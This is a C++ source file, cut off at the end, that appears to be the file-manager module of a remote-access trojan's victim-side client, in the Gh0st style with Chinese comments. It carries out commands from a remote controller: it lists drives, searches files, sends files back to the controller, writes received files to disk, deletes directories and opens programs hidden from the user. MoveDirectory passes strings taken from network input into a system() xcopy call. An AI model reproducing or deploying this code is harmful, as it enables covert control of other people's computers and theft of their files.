// FileManager.cpp: implementation of the CFileManager class.
//
//////////////////////////////////////////////////////////////////////
#include "FileManager.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CFileManager::CFileManager(CClientSocket *pClient):CManager(pClient)
{
	m_nTransferMode = TRANSFER_MODE_NORMAL;
	// 发送驱动器列表, 开始进行文件管理，建立新线程
	SendDriveList();
	m_hWorkThread = NULL;
}

CFileManager::~CFileManager()
{
	m_UploadList.clear();
	StopSearchTheard();
}

void CFileManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	case COMMAND_LIST_FILES:// 获取文件列表
		SendFilesList((char *)lpBuffer + 1);
		break;
	case COMMAND_DELETE_FILE:// 删除文件
		DeleteFile((char *)lpBuffer + 1);
		SendToken(TOKEN_DELETE_FINISH);
		break;
	case COMMAND_DELETE_DIRECTORY:// 删除文件
		//printf("删除目录 %s\n", (char *)(bPacket + 1));
		DeleteDirectory((char *)lpBuffer + 1);
		SendToken(TOKEN_DELETE_FINISH);
		break;
	case COMMAND_MOVE_DIRECTORY:
		MoveDirectory(lpBuffer + 1,nSize -1);
		SendToken(TOKEN_MOVE_FINISH);
		break;
	case COMMAND_MOVE_FILE:
		MyMoveFile(lpBuffer + 1,nSize -1);
		SendToken(TOKEN_MOVE_FINISH);
		break;
	case COMMAND_DOWN_FILES: // 上传文件
		UploadToRemote(lpBuffer + 1);
		break;
	case COMMAND_CONTINUE: // 上传文件
		SendFileData(lpBuffer + 1);
		break;
	case COMMAND_CREATE_FOLDER:
		CreateFolder(lpBuffer + 1);
		break;
	case COMMAND_RENAME_FILE:
		Rename(lpBuffer + 1);
		break;
	case COMMAND_STOP:
		StopTransfer();
		break;
	case COMMAND_SET_TRANSFER_MODE:
		SetTransferMode(lpBuffer + 1);
		break;
	case COMMAND_FILE_SIZE:
		CreateLocalRecvFile(lpBuffer + 1);
		break;
	case COMMAND_FILE_DATA:
		WriteLocalRecvFile(lpBuffer + 1, nSize -1);
		break;
	case COMMAND_OPEN_FILE_SHOW:
		OpenFile((char *)lpBuffer + 1, SW_SHOW);
		break;
	case COMMAND_OPEN_FILE_HIDE:
		OpenFile((char *)lpBuffer + 1, SW_HIDE);
		break;
	case COMMAND_FILES_SEARCH_START:
		SendSearchFilesList((char *)lpBuffer + 1);
		break;
	case COMMAND_FILES_SEARCH_STOP:
		StopSearchTheard();
		SendToken(TOKEN_SEARCH_FILE_FINISH);
		break;
	default:
		break;
	}
}

void CFileManager::FindFileInDir(char* rootDir,char* searchfilename,BOOL bEnabledSubfolder)
{
	WIN32_FIND_DATA fd;   

	char filePathName[256];  
	char tmpPath[256];
	
	ZeroMemory(&fd, sizeof(WIN32_FIND_DATA));  
	ZeroMemory(filePathName, 256);  
	ZeroMemory(tmpPath, 256);  

	strcpy(filePathName, rootDir);  
	
	
	if( filePathName[strlen(filePathName) -1] != '\\' )  
	{  
		strcat(filePathName, "\\");  
	}  
	strcat(filePathName, "*.*");  

	HANDLE hSearch = FindFirstFile(filePathName, &fd);  
	
	do 
	{
		DWORD	dwOffset = 1; // 位移指针
		
		strcpy(tmpPath, rootDir);  
		if( tmpPath[strlen(tmpPath) -1] != '\\' )  
			strcat(tmpPath, "\\");  
		
		strcat(tmpPath, fd.cFileName);  
		
		if( (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)  
			&& strcmp(fd.cFileName, ".") && strcmp(fd.cFileName, "..") )   
		{  
			if (bEnabledSubfolder)
				FindFileInDir(tmpPath,searchfilename,bEnabledSubfolder);  
		}  
		else if( strcmp(fd.cFileName, ".") && strcmp(fd.cFileName, "..") )  
		{
			if (strstr(strupr(fd.cFileName),strupr(searchfilename)) > 0)
			{
				LPBYTE	lpBuffer = NULL;

				lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
			
				// 文件属性 1 字节
				*(lpBuffer + dwOffset) = fd.dwFileAttributes &	FILE_ATTRIBUTE_DIRECTORY;
				dwOffset++;
				
				int nLen  = strlen(tmpPath);
				memcpy(lpBuffer + dwOffset, tmpPath, nLen);
				
				dwOffset += nLen;
				*(lpBuffer + dwOffset) = 0;
				dwOffset++;
				
				memcpy(lpBuffer + dwOffset, &fd.nFileSizeHigh,  sizeof(DWORD));
				memcpy(lpBuffer + dwOffset + 4, &fd.nFileSizeLow,  sizeof(DWORD));
				dwOffset += 8;
				
				// 最后访问时间 8 字节
				memcpy(lpBuffer + dwOffset, &fd.ftLastWriteTime, sizeof(FILETIME));
				dwOffset += 8;
				
				if (dwOffset >1)
				{
					lpBuffer[0] = TOKEN_SEARCH_FILE_LIST;
					
					lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
					
					Send(lpBuffer,  LocalSize(lpBuffer));
					
					Sleep(10);
					LocalFree(lpBuffer);
				}
			}
		} 
	} while(FindNextFile(hSearch, &fd) && !bIsStopSearch);
	
	FindClose(hSearch);
}


void WINAPI CFileManager::FindFileThread(LPVOID lparam)
{
	CFileManager *pThis = (CFileManager *)lparam;
	pThis->FindFileInDir(pThis->filesearch.SearchPath,pThis->filesearch.SearchFileName,pThis->filesearch.bEnabledSubfolder);
	pThis->SendToken(TOKEN_SEARCH_FILE_FINISH);
}

void CFileManager::StopSearchTheard()
{
	if (bIsStopSearch)
		return;
	bIsStopSearch = TRUE;
	WaitForSingleObject(m_hWorkThread, INFINITE);
	CloseHandle(m_hWorkThread);
}

void CFileManager::SendSearchFilesList(LPCTSTR str)
{
	bIsStopSearch  = FALSE; 
	memcpy(&filesearch, str , sizeof(FILESEARCH));

	m_hWorkThread = MyCreateThread(NULL, 
		0, 
		(LPTHREAD_START_ROUTINE)FindFileThread, 
		(LPVOID)this, 
		0, 
		NULL
		);
}

bool CFileManager::MakeSureDirectoryPathExists(LPCTSTR pszDirPath)
{
    LPTSTR p, pszDirCopy;
    DWORD dwAttributes;

    // Make a copy of the string for editing.

    __try
    {

        pszDirCopy = (LPTSTR)malloc(sizeof(TCHAR) * (lstrlen(pszDirPath) + 1));

        if(pszDirCopy == NULL)
            return FALSE;

        lstrcpy(pszDirCopy, pszDirPath);

        p = pszDirCopy;

        //  If the second character in the path is "\", then this is a UNC
        //  path, and we should skip forward until we reach the 2nd \ in the path.

        if((*p == TEXT('\\')) && (*(p+1) == TEXT('\\')))
        {
            p++;            // Skip over the first \ in the name.
            p++;            // Skip over the second \ in the name.

            //  Skip until we hit the first "\" (\\Server\).

            while(*p && *p != TEXT('\\'))
            {
                p = CharNext(p);
            }

            // Advance over it.

            if(*p)
            {
                p++;
            }

            //  Skip until we hit the second "\" (\\Server\Share\).

            while(*p && *p != TEXT('\\'))
            {
                p = CharNext(p);
            }

            // Advance over it also.

            if(*p)
            {
                p++;
            }

        }
        else if(*(p+1) == TEXT(':')) // Not a UNC.  See if it's <drive>:
        {
            p++;
            p++;

            // If it exists, skip over the root specifier

            if(*p && (*p == TEXT('\\')))
            {
                p++;
            }
        }

		while(*p)
        {
            if(*p == TEXT('\\'))
            {
                *p = TEXT('\0');
                dwAttributes = GetFileAttributes(pszDirCopy);

                // Nothing exists with this name.  Try to make the directory name and error if unable to.
                if(dwAttributes == 0xffffffff)
                {
                    if(!CreateDirectory(pszDirCopy, NULL))
                    {
                        if(GetLastError() != ERROR_ALREADY_EXISTS)
                        {
                            free(pszDirCopy);
                            return FALSE;
                        }
                    }
                }
                else
                {
                    if((dwAttributes & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY)
                    {
                        // Something exists with this name, but it's not a directory... Error
                        free(pszDirCopy);
                        return FALSE;
                    }
                }
 
                *p = TEXT('\\');
            }

            p = CharNext(p);
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER)
    {
        // SetLastError(GetExceptionCode());
        free(pszDirCopy);
        return FALSE;
    }

    free(pszDirCopy);
    return TRUE;
}

bool CFileManager::OpenFile(LPCTSTR lpFile, INT nShowCmd)
{

	TCHAR	lpSubKey[500];
	//	HKEY	hKey;
	TCHAR	strTemp[MAX_PATH];
	//	LONG	nSize = sizeof(strTemp);
	TCHAR	*lpstrCat = NULL;
	memset(strTemp, 0, sizeof(strTemp));
	
	TCHAR	*lpExt = (TCHAR	*)strrchr(lpFile, '.');
	if (!lpExt)
		return false;

	TCHAR strResult[MAX_PATH] = {0}; //保存结果
	if (strrchr(lpExt, ' '))
	{
		int nStrLen = strlen(lpExt) - 1 ; //原始字符串长度

		for(int i = nStrLen ; i > 0; i--)
		{
			if(lpExt[i] == ' ')
			{
				strncpy(strResult,lpExt, i );
				break;
			}
		}
	}
	else
		strcpy(strResult,lpExt);
	
// 	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, strResult, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
// 		return false;
// 	RegQueryValue(hKey, NULL, strTemp, &nSize);
// 	RegCloseKey(hKey);
		  

	if(!ReadRegEx(HKEY_CLASSES_ROOT,strResult,0L,REG_SZ,strTemp,NULL,sizeof(strTemp),0))
		return false;
	
	memset(lpSubKey, 0, sizeof(lpSubKey));
	wsprintf(lpSubKey, "%s\\shell\\open\\command", strTemp);

// 	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
// 		return false;
	memset(strTemp, 0, sizeof(strTemp));
	char str[MAX_PATH] = {0};
	if(!ReadRegEx(HKEY_CLASSES_ROOT,lpSubKey,0L,REG_EXPAND_SZ,str,NULL,sizeof(str),0))
		return false;
// 	nSize = sizeof(strTemp);
// 	RegQueryValue(hKey, NULL, strTemp, &nSize);
// 	RegCloseKey(hKey);

	ExpandEnvironmentStrings(str,strTemp,MAX_PATH);
			
	lpstrCat = strstr(strTemp, "\"%1");
	if (lpstrCat == NULL)
		lpstrCat = strstr(strTemp, "%1");
	if (lpstrCat == NULL)
	{
		lstrcat(strTemp, " ");
		lstrcat(strTemp, lpFile);
	}
	else
		lstrcpy(lpstrCat, lpFile);
				
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	if (nShowCmd != SW_HIDE)
	{
		si.lpDesktop = "WinSta0\\Default"; 
	}else
	{
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;
	}
	
	CreateProcess(NULL, strTemp, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	return true;
}

//  发送 被控端的 驱动器列表
UINT CFileManager::SendDriveList()
{
	char	DriveString[256];
	// 前一个字节为令牌，后面的52字节为驱动器跟相关属性
	BYTE	DriveList[1024];
//	char	FileSystem[MAX_PATH];
	char	*pDrive = NULL;
	DriveList[0] = TOKEN_DRIVE_LIST; // 驱动器列表
	GetLogicalDriveStrings(sizeof(DriveString), DriveString);
	pDrive = DriveString;
	
	unsigned __int64	HDAmount = 0;
	unsigned __int64	HDFreeSpace = 0;
	unsigned long		AmntMB = 0; // 总大小
	unsigned long		FreeMB = 0; // 剩余空间
	DWORD	dwOffset = 0; // 位移指针

	typedef BOOL (WINAPI *SHGET )(LPCSTR pszPath,DWORD dwFileAttributes,SHFILEINFOA *psfi,UINT ,UINT); 
	HINSTANCE shell32 = LoadLibrary("shell32.dll");
	SHGET   mySHGetFileInfo= (SHGET  )GetProcAddress(shell32,"SHGetFileInfoA"); 

	for (dwOffset = 1; *pDrive != '\0'; pDrive += lstrlen(pDrive) + 1)
	{
// 		memset(FileSystem, 0, sizeof(FileSystem));
// 		// 得到文件系统信息及大小
// 		GetVolumeInformation(pDrive, NULL, 0, NULL, NULL, NULL, FileSystem, MAX_PATH);
		SHFILEINFO	sfi;
		mySHGetFileInfo(pDrive, FILE_ATTRIBUTE_NORMAL, &sfi, sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
		
		int	nTypeNameLen = lstrlen(sfi.szTypeName) + 1;
//		int	nFileSystemLen = lstrlen(FileSystem) + 1;
		

		// 计算磁盘大小
		if (pDrive[0] != 'A' && pDrive[0] != 'B' && GetDiskFreeSpaceEx(pDrive, (PULARGE_INTEGER)&HDFreeSpace, (PULARGE_INTEGER)&HDAmount, NULL))
		{	
			AmntMB = HDAmount / 1024 / 1024;
			FreeMB = HDFreeSpace / 1024 / 1024;
		}
		else
		{
			AmntMB = 0;
			FreeMB = 0;
		}
		// 开始赋值
		DriveList[dwOffset] = pDrive[0];
		DriveList[dwOffset + 1] = GetDriveType(pDrive);
		
		
		// 磁盘空间描述占去了8字节
		memcpy(DriveList + dwOffset + 2, &AmntMB, sizeof(unsigned long));
		memcpy(DriveList + dwOffset + 6, &FreeMB, sizeof(unsigned long));
		
		// 磁盘卷标名及磁盘类型
		memcpy(DriveList + dwOffset + 10, sfi.szTypeName, nTypeNameLen);
//		memcpy(DriveList + dwOffset + 10 + nTypeNameLen, FileSystem, nFileSystemLen);
		
		dwOffset += 10 + nTypeNameLen;// + nFileSystemLen;
	}

	if(shell32)
		FreeLibrary(shell32);

	return Send((LPBYTE)DriveList, dwOffset);
}

// 发送 远程 文件列表
UINT CFileManager::SendFilesList(LPCTSTR lpszDirectory)
{
	// 重置传输方式
	m_nTransferMode = TRANSFER_MODE_NORMAL;	

	UINT	nRet = 0;
	char	strPath[MAX_PATH];
	char	*pszFileName = NULL;
	LPBYTE	lpList = NULL;
	HANDLE	hFile;
	DWORD	dwOffset = 0; // 位移指针
	int		nLen = 0;
	DWORD	nBufferSize =  1024 * 10; // 先分配10K的缓冲区
	WIN32_FIND_DATA	FindFileData;
	
	lpList = (BYTE *)LocalAlloc(LPTR, nBufferSize);
	
	wsprintf(strPath, "%s\\*.*", lpszDirectory);
	hFile = FindFirstFile(strPath, &FindFileData);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		BYTE bToken = TOKEN_FILE_LIST;
		return Send(&bToken, 1);
	}
	
	*lpList = TOKEN_FILE_LIST;
	
	// 1 为数据包头部所占字节,最后赋值
	dwOffset = 1;
	/*
	文件属性	1
	文件名		strlen(filename) + 1 ('\0')
	文件大小	4
	*/
	do 
	{
		// 动态扩展缓冲区
		if (dwOffset > (nBufferSize - MAX_PATH * 2))
		{
			nBufferSize += MAX_PATH * 2;
			lpList = (BYTE *)LocalReAlloc(lpList, nBufferSize, LMEM_ZEROINIT|LMEM_MOVEABLE);
		}
		pszFileName = FindFileData.cFileName;
		if (strcmp(pszFileName, ".") == 0 || strcmp(pszFileName, "..") == 0)
			continue;
		// 文件属性 1 字节
		*(lpList + dwOffset) = FindFileData.dwFileAttributes &	FILE_ATTRIBUTE_DIRECTORY;
		dwOffset++;
		// 文件名 lstrlen(pszFileName) + 1 字节
		nLen = lstrlen(pszFileName);
		memcpy(lpList + dwOffset, pszFileName, nLen);
		dwOffset += nLen;
		*(lpList + dwOffset) = 0;
		dwOffset++;
		
		// 文件大小 8 字节
		memcpy(lpList + dwOffset, &FindFileData.nFileSizeHigh, sizeof(DWORD));
		memcpy(lpList + dwOffset + 4, &FindFileData.nFileSizeLow, sizeof(DWORD));
		dwOffset += 8;
		// 最后访问时间 8 字节
		memcpy(lpList + dwOffset, &FindFileData.ftLastWriteTime, sizeof(FILETIME));
		dwOffset += 8;


	} while(FindNextFile(hFile, &FindFileData));

	nRet = Send(lpList, dwOffset);

	LocalFree(lpList);
	FindClose(hFile);
	return nRet;
}

bool CFileManager::DeleteDirectory(LPCTSTR lpszDirectory)
{
	WIN32_FIND_DATA	wfd;
	char	lpszFilter[MAX_PATH];
	
	wsprintf(lpszFilter, "%s\\*.*", lpszDirectory);
	
	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) // 如果没有找到或查找失败
		return FALSE;
	
	do
	{
		if (wfd.cFileName[0] != '.')
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char strDirectory[MAX_PATH];
				wsprintf(strDirectory, "%s\\%s", lpszDirectory, wfd.cFileName);
				DeleteDirectory(strDirectory);
			}
			else
			{
				char strFile[MAX_PATH];
				wsprintf(strFile, "%s\\%s", lpszDirectory, wfd.cFileName);
				if(!DeleteFile(strFile))
				{
					SetFileAttributes(strFile, FILE_ATTRIBUTE_NORMAL);
					DeleteFile(strFile);
				}
			}
		}
	} while (FindNextFile(hFind, &wfd));
	
	FindClose(hFind); // 关闭查找句柄
	
	if(!RemoveDirectory(lpszDirectory))
	{
		return FALSE;
	}
	return true;
}

//bool CFileManager::MyMoveDirectory(LPCTSTR lpExistingFileName,LPCTSTR lpNewFileName,DWORD dwOffset ,bool bIsCopy)
// {
// 	WIN32_FIND_DATA	wfd;
// 	char	lpszFilter[MAX_PATH];
// 	
// 	wsprintf(lpszFilter, "%s*.*", lpExistingFileName);
// 	
// 	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
// 	if (hFind == INVALID_HANDLE_VALUE) // 如果没有找到或查找失败
// 	{
// 		return FALSE;
// 	}
// 	do
// 	{
// 		if (wfd.cFileName[0] != '.')
// 		{
// 			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
// 			{
// 				printf("是文件夹-----------------------------------\r\n");
// 				char strDirectory[MAX_PATH];
// 				wsprintf(strDirectory, "%s%s\\", lpExistingFileName, wfd.cFileName);
// 				
// 				char strNewDirectory[MAX_PATH];
// 				wsprintf(strNewDirectory, "%s%s", lpNewFileName, strDirectory + dwOffset);
// 				
// 				
// 				printf("递归 %s 移动到  %s\r\n",strDirectory,strNewDirectory);
// 				MakeSureDirectoryPathExists(strNewDirectory);
// 			}
// 			else
// 			{
// 				printf("是文件\r\n");
// 				char strFile[MAX_PATH];
// 				wsprintf(strFile, "%s%s", lpExistingFileName, wfd.cFileName);
// 				
// 				
// 				char strNewDirectory[MAX_PATH];
// 				wsprintf(strNewDirectory, "%s%s%s", lpNewFileName,lpExistingFileName + dwOffset, wfd.cFileName);
// 				
// 				MakeSureDirectoryPathExists(strNewDirectory);
// 				printf("从%s 移动到%s\r\n", strFile ,strNewDirectory );
// 				
// 				if (bIsCopy)
// 				{
// 					CopyFile(strFile,strNewDirectory,TRUE);
// 				}else
// 				{
// 					MoveFile(strFile,strNewDirectory);
// 				}
// 			}
// 		}
// 	} while (FindNextFile(hFind, &wfd));
// 	
// 	FindClose(hFind); // 关闭查找句柄
// 
// 	if (!bIsCopy)
// 		DeleteDirectory(lpExistingFileName);
// 		
// 	return TRUE;
// }

bool CFileManager::MoveDirectory(LPBYTE lpBuffer, UINT nSize)
{
	FILEMOVE fileMove;
	memcpy(&fileMove,lpBuffer,nSize);
	
	char CommandLine[1024];
	wsprintf(CommandLine,"xcopy \"%s\" \"%s\" /e /i /y",fileMove.lpExistingFileName,fileMove.lpNewFileName);
	
	system(CommandLine);
	
	HINSTANCE Shlwapi = LoadLibrary("Shlwapi.dll"); 
	
	typedef BOOL (WINAPI *TPathFileExistsA)(LPCSTR);	
	TPathFileExistsA MyPathFileExistsA= (TPathFileExistsA)GetProcAddress(Shlwapi, "PathFileExistsA");
	
	if (!fileMove.bIsCopy && MyPathFileExistsA(fileMove.lpNewFileName))
	{
		DeleteDirectory(fileMove.lpExistingFileName);
	}
	
	if (Shlwapi)
		FreeLibrary(Shlwapi);
		
	return true;
}

bool CFileManager::MyMoveFile(LPBYTE lpBuffer, UINT nSize)
{
	FILEMOVE fileMove;
	memcpy(&fileMove,lpBuffer,nSize);
	if (fileMove.bIsCopy)
	{
		CopyFile(fileMove.lpExistingFileName,fileMove.lpNewFileName,TRUE);
	}
	else
	{
		MoveFile(fileMove.lpExistingFileName,fileMove.lpNewFileName);
	}
	
	return true;
}

UINT CFileManager::SendFileSize(LPCTSTR lpszFileName)
{
	UINT	nRet = 0;
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
	// 1 字节token, 8字节大小, 文件名称, '\0'
	HANDLE	hFile;
	// 保存当前正在操作的文件名
	memset(m_strCurrentProcessFileName, 0, sizeof(m_strCurrentProcessFileName));
	strcpy(m_strCurrentProcessFileName, lpszFileName);

	hFile = CreateFile(lpszFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("SendFileSize ERRO CODE : %d",lpszFileName,GetLastError());
		return FALSE;
	}
	dwSizeLow =	GetFileSize(hFile, &dwSizeHigh);
	CloseHandle(hFile);

	// 构造数据包，发送文件长度
	int		nPacketSize = lstrlen(lpszFileName) + 10;

	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
	memset(bPacket, 0, nPacketSize);
	
	bPacket[0] = TOKEN_FILE_SIZE;
	FILESIZE *pFileSize = (FILESIZE *)(bPacket + 1);
	pFileSize->dwSizeHigh = dwSizeHigh;
	pFileSize->dwSizeLow = dwSizeLow;
	memcpy(bPacket + 9, lpszFileName, lstrlen(lpszFileName) + 1);

	nRet = Send(bPacket, nPacketSize);
	LocalFree(bPacket);

	return nRet;
}

UINT CFileManager::SendFileData(LPBYTE lpBuffer)
{
	int		nRet = 0;

	FILESIZE	*pFileSize;
	char		*lpFileName;

	pFileSize = (FILESIZE *)lpBuffer;
	lpFileName = m_strCurrentProcessFileName;

	// 远程跳过，传送下一个
	if (pFileSize->dwSizeLow == -1)
	{
		UploadNext();
		return 0;
	}
	HANDLE	hFile;
	hFile = CreateFile(lpFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return -1;
	}
	//在一个文件中设置当前的读写位置 移动一个打开文件的指针
	SetFilePointer(hFile, pFileSize->dwSizeLow, (long *)&(pFileSize->dwSizeHigh), FILE_BEGIN);

	int		nHeadLength = 9; // 1 + 4 + 4 数据包头部大小
	DWORD	nNumberOfBytesToRead = 1024 * 8 - nHeadLength;
	DWORD	nNumberOfBytesRead = 0;

	LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, 1024 * 8);

	// Token,  大小，偏移，文件名，数据
	lpPacket[0] = TOKEN_FILE_DATA;
	memcpy(lpPacket + 1, pFileSize, sizeof(FILESIZE));
	ReadFile(hFile, lpPacket + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
	CloseHandle(hFile);


	if (nNumberOfBytesRead > 0)
	{
		int	nPacketSize = nNumberOfBytesRead + nHeadLength;
		nRet = Send(lpPacket, nPacketSize);
	}
	else
	{
		UploadNext();
	}

	LocalFree(lpPacket);

	return nRet;
}

// 传送下一个文件
void CFileManager::UploadNext()
{
	list <string>::iterator it = m_UploadList.begin();
	// 删除一个任务
	m_UploadList.erase(it);
	// 还有上传任务
	if(m_UploadList.empty())
	{
		SendToken(TOKEN_TRANSFER_FINISH);
	}
	else
	{
		// 上传下一个
		it = m_UploadList.begin();
		if(!SendFileSize((*it).c_str()))
			UploadNext();
	}
}

int CFileManager::SendToken(BYTE bToken)
{
	return Send(&bToken, 1);
}

bool CFileManager::UploadToRemote(LPBYTE lpBuffer)
{
	// 判断是否是文件夹
	if (lpBuffer[lstrlen((char *)lpBuffer) - 1] == '\\')
	{
		FixedUploadList((char *)lpBuffer);
		if (m_UploadList.empty())
		{
			StopTransfer();
			return true;
		}
	}
	else
	{
		m_UploadList.push_back((char *)lpBuffer);
	}

	list <string>::iterator it = m_UploadList.begin();

	// 发送第一个文件
	SendFileSize((*it).c_str());

	return true;
}

bool CFileManager::FixedUploadList(LPCTSTR lpPathName)
{
	WIN32_FIND_DATA	wfd;
	char	lpszFilter[MAX_PATH];
	char	*lpszSlash = NULL;
	memset(lpszFilter, 0, sizeof(lpszFilter));

	if (lpPathName[lstrlen(lpPathName) - 1] != '\\')
		lpszSlash = "\\";
	else
		lpszSlash = "";

	wsprintf(lpszFilter, "%s%s*.*", lpPathName, lpszSlash);

	
	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) // 如果没有找到或查找失败
	{
		return false;
	}
	do
	{
		if (wfd.cFileName[0] != '.')
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char strDirectory[MAX_PATH];
				wsprintf(strDirectory, "%s%s%s", lpPathName, lpszSlash, wfd.cFileName);
				FixedUploadList(strDirectory);
			}
			else
			{
				char strFile[MAX_PATH];
				wsprintf(strFile, "%s%s%s", lpPathName, lpszSlash, wfd.cFileName);
				m_UploadList.push_back(strFile);
			}
		}
	} while (FindNextFile(hFind, &wfd));
	
	FindClose(hFind); // 关闭查找句柄
	return true;
}

void CFileManager::StopTransfer()
{
	if (!m_UploadList.empty())
		m_UploadList.clear();
	SendToken(TOKEN_TRANSFER_FINISH);
}

void CFileManager::CreateLocalRecvFile(LPBYTE lpBuffer)
{
	FILESIZE	*pFileSize = (FILESIZE *)lpBuffer;
	// 保存当前正在操作的文件名
	memset(m_strCurrentProcessFileName, 0, sizeof(m_strCurrentProcessFileName));
	strcpy(m_strCurrentProcessFileName, (char *)lpBuffer + 8);

	// 正确的取文件大小的方法
	DWORDLONG dwHighBase = MAXDWORD;
	dwHighBase += 1;
	// 保存文件长度
	m_nCurrentProcessFileLength = (pFileSize->dwSizeHigh * dwHighBase) + pFileSize->dwSizeLow;
	
	// 创建多层目录
	MakeSureDirectoryPathExists(m_strCurrentProcessFileName);
	

	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = FindFirstFile(m_strCurrentProcessFileName, &FindFileData);
	
	if (hFind != INVALID_HANDLE_VALUE
		&& m_nTransferMode != TRANSFER_MODE_OVERWRITE_ALL 
		&& m_nTransferMode != TRANSFER_MODE_ADDITION_ALL
		&& m_nTransferMode != TRANSFER_MODE_JUMP_ALL
		)
	{
		SendToken(TOKEN_GET_TRANSFER_MODE);
	}
	else
	{
		GetFileData();
	}
	FindClose(hFind);
}

void CFileManager::GetFileData()
{
	int	nTransferMode;
	switch (m_nTransferMode)
	{
	case TRANSFER_MODE_OVERWRITE_ALL:
		nTransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case TRANSFER_MODE_ADDITION_ALL:
		nTransferMode = TRANSFER_MODE_ADDITION;
		break;
	case TRANSFER_MODE_JUMP_ALL:
		nTransferMode = TRANSFER_MODE_JUMP;
		break;
	default:
		nTransferMode = m_nTransferMode;
	}
	
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = FindFirstFile(m_strCurrentProcessFileName, &FindFileData);
	
	//  1字节Token,四字节偏移高四位，四字节偏移低四位
	BYTE	bToken[9];
	DWORD	dwCreationDisposition; // 文件打开方式 
	memset(bToken, 0, sizeof(bToken));
	bToken[0] = TOKEN_DATA_CONTINUE;
	
	// 文件已经存在
	if (hFind != INVALID_HANDLE_VALUE)
	{
		// 提示点什么
		// 如果是续传
		if (nTransferMode == TRANSFER_MODE_ADDITION)
		{
			memcpy(bToken + 1, &FindFileData.nFileSizeHigh, 4);
			memcpy(bToken + 5, &FindFileData.nFileSizeLow, 4);
			dwCreationDisposition = OPEN_EXISTING;
		}
		// 覆盖
		else if (nTransferMode == TRANSFER_MODE_OVERWRITE)
		{
			// 偏移置0
			memset(bToken + 1, 0, 8);
			// 重新创建
			dwCreationDisposition = CREATE_ALWAYS;
			
		}
		// 传送下一个
		else if (nTransferMode == TRANSFER_MODE_JUMP)
		{
			DWORD dwOffset = -1;
			memcpy(bToken + 5, &dwOffset, 4);
			dwCreationDisposition = OPEN_EXISTING;
		}
	}
	else
	{
		// 偏移置0
		memset(bToken + 1, 0, 8);
		// 重新创建
		dwCreationDisposition = CREATE_ALWAYS;
	}
	FindClose(hFind);

	HANDLE	hFile = 
		CreateFile
		(
		m_strCurrentProcessFileName, 
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		dwCreationDisposition,
		FILE_ATTRIBUTE_NORMAL,
		0
		);
	// 需要错误处理
	if (hFile == INVALID_HANDLE_VALUE)
	{
		m_nCurrentProcessFileLength = 0;
		OutputDebugString("GetFileData ERRO\r\n");
		return;
	}
	CloseHandle(hFile);

	Send(bToken, sizeof(bToken));
}

void CFileManager::WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize)
{
	// 传输完毕
	BYTE	*pData;
	DWORD	dwBytesToWrite;
	DWORD	dwBytesWrite;
	int		nHeadLength = 9; // 1 + 4 + 4  数据包头部大小，为固定的9
	FILESIZE	*pFileSize;
	// 得到数据的偏移
	pData = lpBuffer + 8;
	
	pFileSize = (FILESIZE *)lpBuffer;

	// 得到数据在文件中的偏移

	LONG	dwOffsetHigh = pFileSize->dwSizeHigh;
	LONG	dwOffsetLow = pFileSize->dwSizeLow;

	dwBytesToWrite = nSize - 8;
	
	HANDLE	hFile = 
		CreateFile
		(
		m_strCurrentProcessFileName,
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		0
		);
	
	SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);

	int nRet = 0;
		// 写入文件
	nRet = WriteFile
		(
		hFile,
		pData, 
		dwBytesToWrite, 
		&dwBytesWrite,
		NULL
		);
 	if (nRet <= 0)
 		OutputDebugString("文件写入失败");
	CloseHandle(hFile);
	// 为了比较，计数器递增


	BYTE	bToken[9];
	bToken[0] = TOKEN_DATA_CONTINUE;
	dwOffsetLow += dwBytesWrite;
	memcpy(bToken + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
	memcpy(bToken + 5, &dwOffsetLow, sizeof(dwOffsetLow));

	Send(bToken, sizeof(bToken));
}

void CFileManager::SetTransferMode(LPBYTE lpBuffer)
{
